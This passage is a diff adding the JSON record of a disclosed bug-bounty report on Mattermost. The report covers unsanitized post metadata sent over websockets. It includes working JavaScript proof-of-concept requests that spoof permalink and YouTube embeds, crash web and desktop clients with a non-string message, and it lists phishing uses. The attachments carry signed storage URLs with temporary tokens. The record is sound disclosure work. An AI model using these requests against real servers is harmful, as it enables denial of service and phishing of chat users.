@@ -1,0 +1,177 @@
+{
+  "id": 2541027,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTQxMDI3",
+  "url": "https://hackerone.com/reports/2541027",
+  "title": "Posts sent via websockets aren't sanitized properly",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2024-06-07T13:04:32.448Z",
+  "submitted_at": "2024-06-07T13:04:32.644Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "c0rydoras",
+    "url": "/c0rydoras",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35268,
+    "url": "https://hackerone.com/mattermost",
+    "handle": "mattermost",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Mattermost",
+      "twitter_handle": "Mattermost",
+      "website": "https://mattermost.com",
+      "about": "Open-source collaboration, self-managed or SaaS"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2024-47003"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-10-01T12:28:41.076Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-09-27T07:43:31.521Z",
+  "team_member_agreed_on_going_public_at": "2024-10-01T12:28:40.814Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Posts aren't sanitized the same way when sent via Websockets as they are when saved to the database.\n\n\n## Example 1 - Permalink embed with fully customizable content\n### Code\n```javascript\nconst MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;\nconst MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;\nconst MM_USER_ID = process.env.MM_USER_ID;\nconst MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post\n\nconst MM_TARGET_ID = \"96nffx8oztncuyyxq7nj7p8seh\"; // ID of a post, which the embed will target\nconst MM_SHOWN_USER_ID = \"teur4prbifnh7dhq5rh3cp7q4c\"; // the user shown in the embed, in this example its the userid of system\n\nconst metadata = ({\n    embeds: [\n      {\n        type: \"permalink\",\n        data: {\n          post_id: MM_TARGET_ID,\n          post: {\n            id: MM_TARGET_ID,\n            user_id: MM_SHOWN_USER_ID,\n            channel_id: \"doesnt-matter\",\n            root_id: \"\",\n            original_id: \"\",\n            message: 'This can be whatever i want',\n            type: \"\",\n            props: {},\n            hashtags: \"\",\n            reply_count: 0,\n            last_reply_at: 0,\n            participants: [],\n            metadata: {},\n          },\n          team_name: \"\",\n          channel_display_name: \"can-be-anything-i-want\",\n          channel_type: \"O\",\n          channel_id: \"\",\n        },\n      },\n    ],\n})\n\nconst body = JSON.stringify({\n  file_ids: [],\n  message: \"\",\n  props: {\n    previewed_post: MM_TARGET_ID,\n  },\n  channel_id: MM_CHANNEL_ID,\n  user_id: MM_USER_ID,\n  metadata,\n});\n\nconst resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {\n  headers: {\n    \"Content-Type\": \"application/json\",\n    Authorization: `Bearer ${MM_AUTH_TOKEN}`,\n  },\n  method: \"POST\",\n  body,\n});\n\nconsole.log(JSON.stringify(await resp.json(), null, 4));\n```\n\n### Received Data from WS Connection\n```json\n{\"event\":\"posted\",\"data\":{\"channel_display_name\":\"@arthurd\",\"channel_name\":\"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa\",\"channel_type\":\"D\",\"mentions\":\"[\\\"w1bycrx7apy3xn31j7dyszahfa\\\"]\",\"post\":\"{\\\"id\\\":\\\"ju9uuu3xnjy1pymrp8siyk3t1o\\\",\\\"create_at\\\":1717763281641,\\\"update_at\\\":1717763281641,\\\"edit_at\\\":0,\\\"delete_at\\\":0,\\\"is_pinned\\\":false,\\\"user_id\\\":\\\"1wt8aoiskjg99dap81jx4zjejc\\\",\\\"channel_id\\\":\\\"ucatpix4girt5rp3w4xunng14o\\\",\\\"root_id\\\":\\\"\\\",\\\"original_id\\\":\\\"\\\",\\\"message\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"props\\\":{\\\"previewed_post\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\"},\\\"hashtags\\\":\\\"\\\",\\\"pending_post_id\\\":\\\"\\\",\\\"reply_count\\\":0,\\\"last_reply_at\\\":0,\\\"participants\\\":null,\\\"metadata\\\":{\\\"embeds\\\":[{\\\"type\\\":\\\"permalink\\\",\\\"data\\\":{\\\"channel_display_name\\\":\\\"can-be-anything-i-want\\\",\\\"channel_id\\\":\\\"\\\",\\\"channel_type\\\":\\\"O\\\",\\\"post\\\":{\\\"channel_id\\\":\\\"doesnt-matter\\\",\\\"hashtags\\\":\\\"\\\",\\\"id\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\",\\\"last_reply_at\\\":0,\\\"message\\\":\\\"This can be whatever i want\\\",\\\"metadata\\\":{},\\\"original_id\\\":\\\"\\\",\\\"participants\\\":[],\\\"props\\\":{},\\\"reply_count\\\":0,\\\"root_id\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"user_id\\\":\\\"teur4prbifnh7dhq5rh3cp7q4c\\\"},\\\"post_id\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\",\\\"team_name\\\":\\\"\\\"}}]}}\",\"sender_name\":\"@arthurd\",\"set_online\":true,\"should_ack\":true,\"team_id\":\"\"},\"broadcast\":{\"omit_users\":null,\"user_id\":\"w1bycrx7apy3xn31j7dyszahfa\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"team_id\":\"\",\"connection_id\":\"\",\"omit_connection_id\":\"\"},\"seq\":10}\n```\n\n### Resulting Post\n{F3339043}\n\n### Get request to post\n```json\n{\"id\":\"ju9uuu3xnjy1pymrp8siyk3t1o\",\"create_at\":1717763281641,\"update_at\":1717763281641,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{\"previewed_post\":\"96nffx8oztncuyyxq7nj7p8seh\"},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{}}\n```\n\n## Example 2 - DoS via non-string message using permalink embed\n\n### Code\n```javascript\nconst MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;\nconst MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;\nconst MM_USER_ID = process.env.MM_USER_ID;\nconst MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post\n\nconst MM_TARGET_ID = \"96nffx8oztncuyyxq7nj7p8seh\"; // ID of a post, which the embed will target\nconst MM_SHOWN_USER_ID = \"teur4prbifnh7dhq5rh3cp7q4c\"; // the user shown in the embed, in this example its the userid of system\n\nconst metadata = ({\n    embeds: [\n      {\n        type: \"permalink\",\n        data: {\n          post_id: MM_TARGET_ID,\n          post: {\n            id: MM_TARGET_ID,\n            user_id: MM_SHOWN_USER_ID,\n            channel_id: \"doesnt-matter\",\n            root_id: \"\",\n            original_id: \"\",\n            message: ['This will crash your webapp/desktop app'],\n            type: \"\",\n            props: {},\n            hashtags: \"\",\n            reply_count: 0,\n            last_reply_at: 0,\n            participants: [],\n            metadata: {},\n          },\n          team_name: \"\",\n          channel_display_name: \"can-be-anything-i-want\",\n          channel_type: \"O\",\n          channel_id: \"\",\n        },\n      },\n    ],\n})\n\nconst body = JSON.stringify({\n  file_ids: [],\n  message: \"\",\n  props: {\n    previewed_post: MM_TARGET_ID,\n  },\n  channel_id: MM_CHANNEL_ID,\n  user_id: MM_USER_ID,\n  metadata,\n});\n\nconst resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {\n  headers: {\n    \"Content-Type\": \"application/json\",\n    Authorization: `Bearer ${MM_AUTH_TOKEN}`,\n  },\n  method: \"POST\",\n  body,\n});\n\nconsole.log(JSON.stringify(await resp.json(), null, 4));\n```\n### Received Data from websocket connection\n```json\n{\"event\":\"posted\",\"data\":{\"channel_display_name\":\"@arthurd\",\"channel_name\":\"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa\",\"channel_type\":\"D\",\"mentions\":\"[\\\"w1bycrx7apy3xn31j7dyszahfa\\\"]\",\"post\":\"{\\\"id\\\":\\\"zsx67zqb8frh3knprgon4k1azc\\\",\\\"create_at\\\":1717763588738,\\\"update_at\\\":1717763588738,\\\"edit_at\\\":0,\\\"delete_at\\\":0,\\\"is_pinned\\\":false,\\\"user_id\\\":\\\"1wt8aoiskjg99dap81jx4zjejc\\\",\\\"channel_id\\\":\\\"ucatpix4girt5rp3w4xunng14o\\\",\\\"root_id\\\":\\\"\\\",\\\"original_id\\\":\\\"\\\",\\\"message\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"props\\\":{\\\"previewed_post\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\"},\\\"hashtags\\\":\\\"\\\",\\\"pending_post_id\\\":\\\"\\\",\\\"reply_count\\\":0,\\\"last_reply_at\\\":0,\\\"participants\\\":null,\\\"metadata\\\":{\\\"embeds\\\":[{\\\"type\\\":\\\"permalink\\\",\\\"data\\\":{\\\"channel_display_name\\\":\\\"can-be-anything-i-want\\\",\\\"channel_id\\\":\\\"\\\",\\\"channel_type\\\":\\\"O\\\",\\\"post\\\":{\\\"channel_id\\\":\\\"doesnt-matter\\\",\\\"hashtags\\\":\\\"\\\",\\\"id\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\",\\\"last_reply_at\\\":0,\\\"message\\\":[\\\"This will crash your webapp/desktop app\\\"],\\\"metadata\\\":{},\\\"original_id\\\":\\\"\\\",\\\"participants\\\":[],\\\"props\\\":{},\\\"reply_count\\\":0,\\\"root_id\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"user_id\\\":\\\"teur4prbifnh7dhq5rh3cp7q4c\\\"},\\\"post_id\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\",\\\"team_name\\\":\\\"\\\"}}]}}\",\"sender_name\":\"@arthurd\",\"set_online\":true,\"should_ack\":true,\"team_id\":\"\"},\"broadcast\":{\"omit_users\":null,\"user_id\":\"w1bycrx7apy3xn31j7dyszahfa\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"team_id\":\"\",\"connection_id\":\"\",\"omit_connection_id\":\"\"},\"seq\":14}\n```\n\n### Impact\n{F3339055}\n{F3339056}\n(dead web application, requires restart)\n\nIts important to note that users don't have to be on the channel where the malicious embed is, naviagting there without refreshing the website/desktopapp still ends up in a white page.\n\nMore importantly, one can send embeds with valid messages in multiple channels, then when one post changes the embed e.g. different message, that happens for all occurences, so one could create valid embeds in a couple channels e.g. town-square, off-topic and more, then one with an invalid message and all of those channels now result in a whitepage (crash) for webapp/desktopap users.\n\n### Get request of post\n```json\n{\"id\":\"zsx67zqb8frh3knprgon4k1azc\",\"create_at\":1717763588738,\"update_at\":1717763588738,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{\"previewed_post\":\"96nffx8oztncuyyxq7nj7p8seh\"},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{}}\n```\n\n## Example 3 - Youtube Embed with different link\n\n### Code\n```javascript\nconst MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;\nconst MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;\nconst MM_USER_ID = process.env.MM_USER_ID;\nconst MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post\n\nconst TARGET_URL = \"https://github.com/c0rydoras\";\n\nconst metadata = {\n  embeds: [\n    {\n      type: \"opengraph\",\n      url: `${TARGET_URL}?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ`,\n      data: {\n        type: \"video.other\",\n        url: \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\n        title: \"Rick Astley - Never Gonna Give You Up (Official Music Video)\",\n        description:\n          \"The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...\",\n        determiner: \"\",\n        site_name: \"YouTube\",\n        locale: \"\",\n        locales_alternate: null,\n        images: [\n          {\n            url: \"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg\",\n            secure_url: \"\",\n            type: \"\",\n            width: 1280,\n            height: 720,\n          },\n        ],\n        audios: null,\n        videos: null,\n      },\n    },\n  ],\n  images: {\n    \"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg\": {\n      width: 1280,\n      height: 720,\n      format: \"jpeg\",\n      frame_count: 0,\n    },\n  },\n};\n\nconst body = JSON.stringify({\n  file_ids: [],\n  message: \"\",\n  channel_id: MM_CHANNEL_ID,\n  user_id: MM_USER_ID,\n  metadata,\n});\n\nconst resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {\n  headers: {\n    \"Content-Type\": \"application/json\",\n    Authorization: `Bearer ${MM_AUTH_TOKEN}`,\n  },\n  method: \"POST\",\n  body,\n});\n\nconsole.log(JSON.stringify(await resp.json(), null, 4));\n```\n\n### Received data from websocket connection\n```json\n{\"event\":\"posted\",\"data\":{\"channel_display_name\":\"@arthurd\",\"channel_name\":\"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa\",\"channel_type\":\"D\",\"mentions\":\"[\\\"w1bycrx7apy3xn31j7dyszahfa\\\"]\",\"post\":\"{\\\"id\\\":\\\"rpaioun83fds5ppf78bstpp3pw\\\",\\\"create_at\\\":1717764679114,\\\"update_at\\\":1717764679114,\\\"edit_at\\\":0,\\\"delete_at\\\":0,\\\"is_pinned\\\":false,\\\"user_id\\\":\\\"1wt8aoiskjg99dap81jx4zjejc\\\",\\\"channel_id\\\":\\\"ucatpix4girt5rp3w4xunng14o\\\",\\\"root_id\\\":\\\"\\\",\\\"original_id\\\":\\\"\\\",\\\"message\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"props\\\":{},\\\"hashtags\\\":\\\"\\\",\\\"pending_post_id\\\":\\\"\\\",\\\"reply_count\\\":0,\\\"last_reply_at\\\":0,\\\"participants\\\":null,\\\"metadata\\\":{\\\"embeds\\\":[{\\\"type\\\":\\\"opengraph\\\",\\\"url\\\":\\\"https://github.com/c0rydoras?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ\\\",\\\"data\\\":{\\\"audios\\\":null,\\\"description\\\":\\\"The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...\\\",\\\"determiner\\\":\\\"\\\",\\\"images\\\":[{\\\"height\\\":720,\\\"secure_url\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"url\\\":\\\"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg\\\",\\\"width\\\":1280}],\\\"locale\\\":\\\"\\\",\\\"locales_alternate\\\":null,\\\"site_name\\\":\\\"YouTube\\\",\\\"title\\\":\\\"Rick Astley - Never Gonna Give You Up (Official Music Video)\\\",\\\"type\\\":\\\"video.other\\\",\\\"url\\\":\\\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\\\",\\\"videos\\\":null}}]}}\",\"sender_name\":\"@arthurd\",\"set_online\":true,\"should_ack\":true,\"team_id\":\"\"},\"broadcast\":{\"omit_users\":null,\"user_id\":\"\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"team_id\":\"\",\"connection_id\":\"\",\"omit_connection_id\":\"\"},\"seq\":4}\n```\n\n### Rendered Post\n{F3339087}\n{F3339088}\n\nThe name and other values are also customizable\n{F3339089}\n\n### Get request of post\n```json\n{\"id\":\"rpaioun83fds5ppf78bstpp3pw\",\"create_at\":1717764679114,\"update_at\":1717764679114,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{}}\n```\n\n## Impact\n\nThis can be abused in several ways. Here are some I found, i'm sure theres a lot more.\n- CWE-405 by having a very large payload (e.g. a lot of things in metadata), can take down server (similar to CVE\\-2024-24988)\n- DoS by sending  a permalink embed with a `message` that isn't a string\n- Lots of ways for phishing e.g. Youtube embed that can be freely customized\n- False Permalink embeds of posts that don't exist with freely customizable channel, user, time, message",
+  "bounty_amount": "150.0",
+  "formatted_bounty": "$150",
+  "weakness": {
+    "id": 107,
+    "name": "Improper Input Validation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3339043,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lsf9qh518pc18uj82whzo30jpbxa?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T202454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7e1526a1d229cded92a508f59f480a172bebfd5eb8b301925ffd939b863d8bc1",
+      "file_size": 10152,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3339055,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fr8nfy7ho3gydn186vszoyv3e9vc?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T202454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f424a32cd792046f47890d3b914fe6a079aa19ee257a510ff6f0e0ffbf0fa739",
+      "file_size": 24462,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3339056,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1w13h9ciav3woecbkstgfldp0dt9?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T202454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2741f9814d8c445798804b786f8db85bdc1816d09d99c91939cd22190cc6837b",
+      "file_size": 3350,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3339087,
+      "file_name": "image.png",
